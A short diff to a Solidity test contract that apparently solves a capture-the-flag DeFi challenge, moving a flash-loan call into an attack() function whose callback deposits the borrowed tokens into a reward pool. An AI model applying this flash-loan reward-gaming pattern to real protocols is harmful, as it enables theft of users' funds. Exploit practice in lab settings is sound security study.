@@ -28,9 +28,6 @@ contract Rewardead is Test{
         dvt.approve(address(loan), type(uint256).max);
     }
 
-    function getFunds() external {
-        loan.flashLoan(TOKENS_IN_LENDER_POOL);
-    }
 
     function receiveFlashLoan(uint256 amount) external{
         pool.deposit(TOKENS_IN_LENDER_POOL);
@@ -41,6 +38,6 @@ contract Rewardead is Test{
     }
 
     function attack() external{
-        
+          loan.flashLoan(TOKENS_IN_LENDER_POOL);
     }
 }
